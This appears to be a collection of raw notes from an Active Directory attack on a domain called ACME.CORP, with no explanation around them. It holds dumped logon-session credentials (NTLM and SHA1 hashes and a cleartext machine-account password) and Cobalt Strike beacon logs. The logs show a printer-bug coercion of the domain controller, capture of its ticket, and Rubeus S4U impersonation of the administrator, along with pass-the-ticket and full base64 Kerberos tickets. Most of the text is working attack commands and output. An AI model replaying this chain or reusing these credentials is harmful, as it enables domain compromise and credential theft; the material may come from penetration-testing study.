	 * Password : <qmri[N/;4ilu(C/vPseV<Q,j(qMX.TQ%&sY9;SyrE+Rv*='"Rp<W-x"yk"XLY:,[c%?c--G7nR2f2DL/YF(,=mgb6zv[1qdqt/3UNsD]\skXu'WnaJh:RS"
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 62318 (00000000:0000f36e)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/23/2025 8:34:52 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : ACME
	 * NTLM     : 3d45daee0c88fcda6d325b9f5581549c
	 * SHA1     : 9dd06de9eaefc3fe2f1f139635a93ff81ccdf15d
	tspkg :	
	wdigest :	
	 * Username : WEB$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WEB$
	 * Domain   : acme.corp
	 * Password : <qmri[N/;4ilu(C/vPseV<Q,j(qMX.TQ%&sY9;SyrE+Rv*='"Rp<W-x"yk"XLY:,[c%?c--G7nR2f2DL/YF(,=mgb6zv[1qdqt/3UNsD]\skXu'WnaJh:RS"
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB$
Domain            : ACME
Logon Server      : (null)
Logon Time        : 4/23/2025 8:34:51 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : ACME
	 * NTLM     : 3d45daee0c88fcda6d325b9f5581549c
	 * SHA1     : 9dd06de9eaefc3fe2f1f139635a93ff81ccdf15d
	tspkg :	
	wdigest :	
	 * Username : WEB$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : web$
	 * Domain   : ACME.CORP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 31008 (00000000:00007920)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/23/2025 8:34:50 AM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : ACME
	 * NTLM     : 3d45daee0c88fcda6d325b9f5581549c
	 * SHA1     : 9dd06de9eaefc3fe2f1f139635a93ff81ccdf15d
	tspkg :	
	wdigest :	
	 * Username : WEB$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WEB$
	 * Domain   : acme.corp
	 * Password : <qmri[N/;4ilu(C/vPseV<Q,j(qMX.TQ%&sY9;SyrE+Rv*='"Rp<W-x"yk"XLY:,[c%?c--G7nR2f2DL/YF(,=mgb6zv[1qdqt/3UNsD]\skXu'WnaJh:RS"
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/23/2025 8:34:52 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 31033 (00000000:00007939)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/23/2025 8:34:50 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : ACME
	 * NTLM     : 3d45daee0c88fcda6d325b9f5581549c
	 * SHA1     : 9dd06de9eaefc3fe2f1f139635a93ff81ccdf15d
	tspkg :	
	wdigest :	
	 * Username : WEB$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WEB$
	 * Domain   : acme.corp
	 * Password : <qmri[N/;4ilu(C/vPseV<Q,j(qMX.TQ%&sY9;SyrE+Rv*='"Rp<W-x"yk"XLY:,[c%?c--G7nR2f2DL/YF(,=mgb6zv[1qdqt/3UNsD]\skXu'WnaJh:RS"
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 29884 (00000000:000074bc)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/23/2025 8:34:49 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : ACME
	 * NTLM     : 3d45daee0c88fcda6d325b9f5581549c
	 * SHA1     : 9dd06de9eaefc3fe2f1f139635a93ff81ccdf15d
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEB$
Domain            : ACME
Logon Server      : (null)
Logon Time        : 4/23/2025 8:34:49 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WEB$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : web$
	 * Domain   : ACME.CORP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

```




```

```


```python
[04/23 14:34:02] beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc.acme.corp web.acme.corp
[04/23 14:34:03] [*] Tasked beacon to run .NET program: SharpSpoolTrigger.exe dc.acme.corp web.acme.corp
[04/23 14:34:04] [+] host called home, sent: 130864 bytes
[04/23 14:34:05] [+] received output:
NdrClientCall2x64
[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6

```




```

[*] 4/23/2025 1:34:05 PM UTC - Found new TGT:

  User                  :  DC$@ACME.CORP
  StartTime             :  4/23/2025 8:36:38 AM
  EndTime               :  4/23/2025 6:35:37 PM
  RenewTill             :  4/30/2025 8:35:37 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFTjCCBUqgAwIBBaEDAgEWooIEYTCCBF1hggRZMIIEVaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQo4IEHzCCBBugAwIBEqEDAgECooIEDQSCBAnX4CGtG3f7bLvBZJP2m00A3uEQ6rLNAJQDuWfycc+6iSlOQ2EahiaNgC08OMgWlcFIfWGduZji1KYkMLo5hdUqhtqMsDX+wcgwAhPtBLpwo6R5v1rZbcCBUC6xkR98vCLWdSaFiQOO98tAG7Nko32GEGsKuGuO59d7jVSV7uQLjNWABCKH8lhsf/JgF4+YkmbXieHvT9goVab8Vy8nB95uD/C7YpR3Y4Xs82Rc5/GPbgZnR9Bjg4iHijHJDl+OlPdxYJySTsfUAwku4n0/c2n6N6BELfR4YGVhz5hgT4uzBpC4jaPHjHeqFdqcUC/KlhzB0w6jsCVPWl+S1mY7X86OJ2Ih4y9ETZASN4EFcvKlfGN1biqWbhkqKvDLCLzsiLvBrPVEe2rClfF16H/J7X6v+m5tMFD02/inqPzGfBhbcMgwcRqV/0CaxgMdgIb2zqVGxOFG+Ha56pB5Ce+RHslHkkrYtT6juJOmBddP5KdaXV97haArCywBNzqWJySx3apvhSMZUMWTodjFi7nTwCeuLj43GOmD0nKZUBVuq6TXHfwXdY5WM+Tnw/V4pMeKH/SwiZ1XW+opHEhXHT8tY2+AyKYT3JDEA0ZcEOXhtSTVyUWv6gfV5b3y7cdcCZ2oZ4Hr5DnpRbg17jcx/sZTzlDiDjIvJXX7t+MNNgsBO1R+Lh5FUiBrL9UV62PncJrlCHJ9XDXFso3MYtgmcvdWiLu5yJWVS2GDEM5EIwagyjgB59PfwnJlrjchpl8daSllUnIbKC0cgh8UFU3aO9AwXiOaMK02qcKpdJkGgiPw1Rpwh+YKYkHoi6Uj3OLSgTFLPK0ah9pLXsSnAgK5W37XjHIv+Jarg0EyXo8gMIRL6EXdskeEeO+VHfH9PuIottqc0oETNInUPTKIdLf0YxM/LB367IrkUmFMdwFXSDfVJsDMd+s8/iFD3F9papLqeLNn4QMi8vl3CGH9pHO1y0269rPUX4tHncfcD9lSUmc0t84zzvlg/NNexVI9beK+MBk7qdIK22HtfC9BiRFHcOVG9ZlM1dKKj3nbaEbtdVZZ2AxkU9nT2896r6IfXkjLGZANOKtgh5zf63k6AUi9P+NU/EFb1/pRcQnOBiQEwuKPZQ6yJnGeiY18DybtLVp9riboEnHhwg1YexcRT16GPOP08szVBUpfeBYcUpJ58PuJCUH27lPnbK2cbD9wrW0lbsjBGqYD6FwpEWadBBe7AzC/mYSWwaUUQF74D4+BhRr9QYxLyeMal5HYRCGEU32WttLQzstRTjtEpbO8d9nG3v+SPd10U01ZF2aNgjYepbUd1q2lu6RI9RzTHpFueVXnNbej5OkjWz6KRaU3QqigWhqjyQaZGrN1b8rjlSt/o4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugKzApoAMCARKhIgQgcaeVasmHl4uVKr//mZEgVBM6dfCKZWNpB7iztHyJKg+hCxsJQUNNRS5DT1JQohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjUwNDIzMDgzNjM4WqYRGA8yMDI1MDQyMzE4MzUzN1qnERgPMjAyNTA0MzAwODM1MzdaqAsbCUFDTUUuQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQ

[*] Ticket cache size: 4


```


---


## RESTART

```
[*] 4/24/2025 11:34:01 AM UTC - Found new TGT:

  User                  :  DC$@ACME.CORP
  StartTime             :  4/24/2025 11:33:56 AM
  EndTime               :  4/24/2025 6:39:13 PM
  RenewTill             :  5/1/2025 8:39:13 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFTjCCBUqgAwIBBaEDAgEWooIEYTCCBF1hggRZMIIEVaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQo4IEHzCCBBugAwIBEqEDAgECooIEDQSCBAkxSnE9p9nJ8BOOJroxMzA4wTttWNBvb7ZvEsgkdPatEleEYMtLSUQNooN33JANO6NaOe9jy9aRJjMCbRYeIICCA6+dlsH8MTxLe9aVfGoBZy9vROHiBkNGy2JFqVaM46VRnL45iW+6aZzc1uSDLD+8Mn83lWp+yNV9fFNSWpzFAllcsD8wAsn6OgOYcmwV6eGZWJk69ZH2Ezqnv3XPP9xSgBcRvBTmyXLaEeKPSFGMBVrE3uTyUQtRaPDAiWP9+ZtHERmveLGw6OLmLbdrLRM6vSAwxzlUqaO80Rhr+GJjkp1syCVC7ZBLyQQUm6VKrJ28KeHP86U0HCSW3amyjOY8+eP2XOUFRk3Gpx9gvZ5g96mKBWLT9NIo1CWj7ZT/q6XVyuY6qQOCGvzAYjqFaK6ml2keFc4fKiN3dxCe+s5Y1UC+sSqs6kEyDoLsQ8Ob+KvmnPNP1G8dRmWgLey809Bo/woi50VJJQ+DR/M+fErc7iXEE0LsijFwzrTMppDPSswyCu+PQPmFteCdpFgijcSdsJufvz6QPmDfYMO8SzeyMpv+iRwV4gieKhhs44Uqx8FmpLwdxvjOdypnvCDjeQGMKu5LwcC8nKElgrFeelC5dry/Q4NyU/l4RoTxYzt42isZIz9ztNouVHeudhwGLMGBUyuHJ+D3nVVVE9WLFzVx0nWBZB+27vAoSbEXVQ5de8ykrtdwrCgYnk/tKWhBDhVlCnPAGyAAH8GZD5t3T88n2tVJPRYFq1LEMxAIB+RjLrw0tl0YIPc6Dkaeu2W/VN3H7XYwGnptJls5CHqFEY+kWRJh2nFIU/u2n0/NfHza6c7MfFoCFoRxBMGoPkpuiMizrFpE1yX8FDkjCqcxy0TEXDL0EhVIrOi9swP617yQRKrCokbqQPQ/kwzPdl9o10HT/2VhWwWjvlAfm2XNW8EskiVtPvqcbvlVMx1S5adaGf4JWVu5DyolGgUWBpDv3DHEEa2W726N7YiDxdIjqdOH64LV4lvpGBZ6JQMznvrmh2B8wJqOV8S/n83kcOjOdvne8cJJq6ArrN4raSB2A6LJWlvyMS/LAS6piTXI6EvrLID3Jm4rbhZ8TiomRzuJrX66tJODH2K717gErkDvhpeXc4W5QeEWQm1P59D0+/qZr46Jgibw+Ww1b5ZKEY+d8D7oxYLSPjeWwRLDJGtqqnORUNpkfW10K59/wgYsedQGR4BviM/EO0ErTZ1ZjkXn8WWWLPKa9G/WIqwTO63x8g3D0JODWETrXqjoHodMWfllHwnQdic/jXfPTJKEH9fL6ptn6kpzs+X9q4plbkVZLS2TBgCxUDmaRvrroMCCpxCkSh6N7R015cnAqdbrJSVF/Mk3+hSmnogfr1e4o4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugKzApoAMCARKhIgQgdcA/MPUtsCoNWHl14Jmty64qoTVCt20jcUsOSGP1lg6hCxsJQUNNRS5DT1JQohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjUwNDI0MTEzMzU2WqYRGA8yMDI1MDQyNDE4MzkxM1qnERgPMjAyNTA1MDEwODM5MTNaqAsbCUFDTUUuQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQ

[*] Ticket cache size: 5

```



```
[04/24 12:36:51] [*] Tasked beacon to run .NET program: Rubeus.exe s4u /impersonateuser:administrator /self /altservice:cifs/DC.ACME.CORP /user:DC$ /ticket:doIFTjCCBUqgAwIBBaEDAgEWooIEYTCCBF1hggRZMIIEVaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQo4IEHzCCBBugAwIBEqEDAgECooIEDQSCBAkxSnE9p9nJ8BOOJroxMzA4wTttWNBvb7ZvEsgkdPatEleEYMtLSUQNooN33JANO6NaOe9jy9aRJjMCbRYeIICCA6+dlsH8MTxLe9aVfGoBZy9vROHiBkNGy2JFqVaM46VRnL45iW+6aZzc1uSDLD+8Mn83lWp+yNV9fFNSWpzFAllcsD8wAsn6OgOYcmwV6eGZWJk69ZH2Ezqnv3XPP9xSgBcRvBTmyXLaEeKPSFGMBVrE3uTyUQtRaPDAiWP9+ZtHERmveLGw6OLmLbdrLRM6vSAwxzlUqaO80Rhr+GJjkp1syCVC7ZBLyQQUm6VKrJ28KeHP86U0HCSW3amyjOY8+eP2XOUFRk3Gpx9gvZ5g96mKBWLT9NIo1CWj7ZT/q6XVyuY6qQOCGvzAYjqFaK6ml2keFc4fKiN3dxCe+s5Y1UC+sSqs6kEyDoLsQ8Ob+KvmnPNP1G8dRmWgLey809Bo/woi50VJJQ+DR/M+fErc7iXEE0LsijFwzrTMppDPSswyCu+PQPmFteCdpFgijcSdsJufvz6QPmDfYMO8SzeyMpv+iRwV4gieKhhs44Uqx8FmpLwdxvjOdypnvCDjeQGMKu5LwcC8nKElgrFeelC5dry/Q4NyU/l4RoTxYzt42isZIz9ztNouVHeudhwGLMGBUyuHJ+D3nVVVE9WLFzVx0nWBZB+27vAoSbEXVQ5de8ykrtdwrCgYnk/tKWhBDhVlCnPAGyAAH8GZD5t3T88n2tVJPRYFq1LEMxAIB+RjLrw0tl0YIPc6Dkaeu2W/VN3H7XYwGnptJls5CHqFEY+kWRJh2nFIU/u2n0/NfHza6c7MfFoCFoRxBMGoPkpuiMizrFpE1yX8FDkjCqcxy0TEXDL0EhVIrOi9swP617yQRKrCokbqQPQ/kwzPdl9o10HT/2VhWwWjvlAfm2XNW8EskiVtPvqcbvlVMx1S5adaGf4JWVu5DyolGgUWBpDv3DHEEa2W726N7YiDxdIjqdOH64LV4lvpGBZ6JQMznvrmh2B8wJqOV8S/n83kcOjOdvne8cJJq6ArrN4raSB2A6LJWlvyMS/LAS6piTXI6EvrLID3Jm4rbhZ8TiomRzuJrX66tJODH2K717gErkDvhpeXc4W5QeEWQm1P59D0+/qZr46Jgibw+Ww1b5ZKEY+d8D7oxYLSPjeWwRLDJGtqqnORUNpkfW10K59/wgYsedQGR4BviM/EO0ErTZ1ZjkXn8WWWLPKa9G/WIqwTO63x8g3D0JODWETrXqjoHodMWfllHwnQdic/jXfPTJKEH9fL6ptn6kpzs+X9q4plbkVZLS2TBgCxUDmaRvrroMCCpxCkSh6N7R015cnAqdbrJSVF/Mk3+hSmnogfr1e4o4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugKzApoAMCARKhIgQgdcA/MPUtsCoNWHl14Jmty64qoTVCt20jcUsOSGP1lg6hCxsJQUNNRS5DT1JQohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjUwNDI0MTEzMzU2WqYRGA8yMDI1MDQyNDE4MzkxM1qnERgPMjAyNTA1MDEwODM5MTNaqAsbCUFDTUUuQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQ  /nowrap
[04/24 12:36:58] [+] host called home, sent: 559600 bytes
[04/24 12:36:58] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'DC$@ACME.CORP'
[*] Using domain controller: dc.acme.corp (10.10.120.10)
[*] Sending S4U2self request to 10.10.120.10:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/DC.ACME.CORP'
[*] Got a TGS for 'administrator' to 'cifs@ACME.CORP'
[*] base64(ticket.kirbi):

      doIFvDCCBbigAwIBBaEDAgEWooIExDCCBMBhggS8MIIEuKADAgEFoQsbCUFDTUUuQ09SUKIfMB2gAwIBAaEWMBQbBGNpZnMbDERDLkFDTUUuQ09SUKOCBIEwggR9oAMCARKhAwIBA6KCBG8EggRr0aDv06Uk9Q5aUiPw/DA/T3igPx5of6n+TZLYUZebuPRHX5+f04B0JB4LMF8LN5EunKsCk0ZbjlDPCdBvnJML2B9tNqIKuJnfIXDgfHqVojgo6JRyj0jwBQPE9d2mOwBQO4uJ/kaAuaw8MEIJ3jgRaqEckYdce8N0dma38xjmpAiKj0IxaktFiPbnwqr9V8fhCBT0dHYZY+4qDAfV4MW48ftdX9djtVoTHqNN+VAa+hUjk/j3GPBzQ9pjKlYN1iMMpDtX2SFLTI1C1rzw8+IAPXdxBz5OqdQhb71Lwo65/mzK9PovpAuUlc0n8AUTz931iq8+4Se1Ro4Ioo/iwH2uSjIiJcqhloR6h15ogme9P5yj+i5N3GAZN9SGG0HAk1Wh56HyurPu4/HXobFnd9h7iibhcjZnVyRsS9LH4X2rcGb6JZ6HhxXo3MQmHuCACAifeePOMF06u3HIlD3jJGT8zGOmPFI/FqCyPCY4rX3Zhtq2mQrS0QJOYOWFBJYpBYQBBjNlSEB77tsI6mLjhBuR9PF1oMs7m68dJDagANdA+Uo6Ra6rlBfDO037aJF903AkhdChvX+tPNZRJOYJI+6qLajGuWgSlbsy1TlNe4wjUC5p7SY90z3nLdXRK/dB8DcTHvUyRItS195NcVT29LncGNLEarP95S5/zaHhzR3Z333NfNKSq8+dHxdzg8W4Jq7qy3nhXstXMWIa/Sh2z1wz/5bi2p1ZIBU4ngY1cdETz/cWNCyP9cQD+x7X510EXk4lQFw6NTMjAs/2fq35p2lSNLV5V6FVkEAWxcQ/aBXXYsltF/1XptSso2GRv0dg32OYb4F83pQxg2a38NZBZDFMOrlU3wB41i32/SKYeyCKYqiSC6zWx/S1YjbU1uSnIZeTvFLYO+4/Ji+rXe3YGVv3I4PEQM51wfV9USw/TKcblub7KUB45Zje+8Q0+TJgYKH+uy5+0IqBzsD6WSGWwLIkBXOwrz2BBxvV9wtTsEpUznH7JqraERLdjr302su22FCsVyTuaUhixXxIUwqOxxsgR5MtcCnkVdMrcoSbwmTRHMIC/Ygk3Roh++cxTA3Uh5jIdZv/IpnwlqzQj7+06ElqEIihNG0wrGN+vVVUJpReYz9aQe0iFCZatVOaOhQAY2KGjg9/tYmaiPue4txrrwrgy5N3CwtCWAEmoAloIFmkYseX/5pBTwLYTLtNh6VuaBVrhlNx+sS2h1ut0Ll1pCiDZeugB8JY0skNkdCON3N3BVr0+EU1pGHKLRinApqU9V5d1Vo1Wm+zEhpNrGU8tzPUUc/UcUvyhlK1cy72AZ5Lp4igHKwdg69P/B8LOBlTqz6lxGYGj75MxsHaYzZKveSgJzw6X4FcgRkvvQFypQqWmx84aKlnAqz2jwoPdM/EjcEnZXIqTjqXNUuP+Dy4j4P9LYK3kBT823E/VzHNWPsBF0Pk0ctXV8dqLVLXm8raVcMCRo8wvqVV6qiBWBgt81ps3ankW4lNokLzY0+Ko4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgAkyZwo9Cb2dkHGA2aPDLFeh9+LX4cs+kTVzucdmoD0GhCxsJQUNNRS5DT1JQohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAYKUAAKURGA8yMDI1MDQyNDExMzY1OFqmERgPMjAyNTA0MjQxODM5MTNapxEYDzIwMjUwNTAxMDgzOTEzWqgLGwlBQ01FLkNPUlCpHzAdoAMCAQGhFjAUGwRjaWZzGwxEQy5BQ01FLkNPUlA=


```





```
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
```









---





```
[04/23 14:39:11] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
[04/23 14:39:14] [*] Tasked beacon to run .NET program: Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
[04/23 14:39:16] [+] host called home, sent: 555872 bytes
[04/23 14:39:17] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Create Process (/netonly)


[*] Using random username and password.

[*] Showing process : False
[*] Username        : MIWTXF2M
[*] Domain          : EU3OU3YW
[*] Password        : V28TQCMN
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4024
[+] LUID            : 0x2ecfbf

```



```
[04/23 14:40:09] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x2ecfbf /ticket:doIFTjCCBUqgAwIBBaEDAgEWooIEYTCCBF1hggRZMIIEVaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQo4IEHzCCBBugAwIBEqEDAgECooIEDQSCBAnX4CGtG3f7bLvBZJP2m00A3uEQ6rLNAJQDuWfycc+6iSlOQ2EahiaNgC08OMgWlcFIfWGduZji1KYkMLo5hdUqhtqMsDX+wcgwAhPtBLpwo6R5v1rZbcCBUC6xkR98vCLWdSaFiQOO98tAG7Nko32GEGsKuGuO59d7jVSV7uQLjNWABCKH8lhsf/JgF4+YkmbXieHvT9goVab8Vy8nB95uD/C7YpR3Y4Xs82Rc5/GPbgZnR9Bjg4iHijHJDl+OlPdxYJySTsfUAwku4n0/c2n6N6BELfR4YGVhz5hgT4uzBpC4jaPHjHeqFdqcUC/KlhzB0w6jsCVPWl+S1mY7X86OJ2Ih4y9ETZASN4EFcvKlfGN1biqWbhkqKvDLCLzsiLvBrPVEe2rClfF16H/J7X6v+m5tMFD02/inqPzGfBhbcMgwcRqV/0CaxgMdgIb2zqVGxOFG+Ha56pB5Ce+RHslHkkrYtT6juJOmBddP5KdaXV97haArCywBNzqWJySx3apvhSMZUMWTodjFi7nTwCeuLj43GOmD0nKZUBVuq6TXHfwXdY5WM+Tnw/V4pMeKH/SwiZ1XW+opHEhXHT8tY2+AyKYT3JDEA0ZcEOXhtSTVyUWv6gfV5b3y7cdcCZ2oZ4Hr5DnpRbg17jcx/sZTzlDiDjIvJXX7t+MNNgsBO1R+Lh5FUiBrL9UV62PncJrlCHJ9XDXFso3MYtgmcvdWiLu5yJWVS2GDEM5EIwagyjgB59PfwnJlrjchpl8daSllUnIbKC0cgh8UFU3aO9AwXiOaMK02qcKpdJkGgiPw1Rpwh+YKYkHoi6Uj3OLSgTFLPK0ah9pLXsSnAgK5W37XjHIv+Jarg0EyXo8gMIRL6EXdskeEeO+VHfH9PuIottqc0oETNInUPTKIdLf0YxM/LB367IrkUmFMdwFXSDfVJsDMd+s8/iFD3F9papLqeLNn4QMi8vl3CGH9pHO1y0269rPUX4tHncfcD9lSUmc0t84zzvlg/NNexVI9beK+MBk7qdIK22HtfC9BiRFHcOVG9ZlM1dKKj3nbaEbtdVZZ2AxkU9nT2896r6IfXkjLGZANOKtgh5zf63k6AUi9P+NU/EFb1/pRcQnOBiQEwuKPZQ6yJnGeiY18DybtLVp9riboEnHhwg1YexcRT16GPOP08szVBUpfeBYcUpJ58PuJCUH27lPnbK2cbD9wrW0lbsjBGqYD6FwpEWadBBe7AzC/mYSWwaUUQF74D4+BhRr9QYxLyeMal5HYRCGEU32WttLQzstRTjtEpbO8d9nG3v+SPd10U01ZF2aNgjYepbUd1q2lu6RI9RzTHpFueVXnNbej5OkjWz6KRaU3QqigWhqjyQaZGrN1b8rjlSt/o4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugKzApoAMCARKhIgQgcaeVasmHl4uVKr//mZEgVBM6dfCKZWNpB7iztHyJKg+hCxsJQUNNRS5DT1JQohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjUwNDIzMDgzNjM4WqYRGA8yMDI1MDQyMzE4MzUzN1qnERgPMjAyNTA0MzAwODM1MzdaqAsbCUFDTUUuQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQ





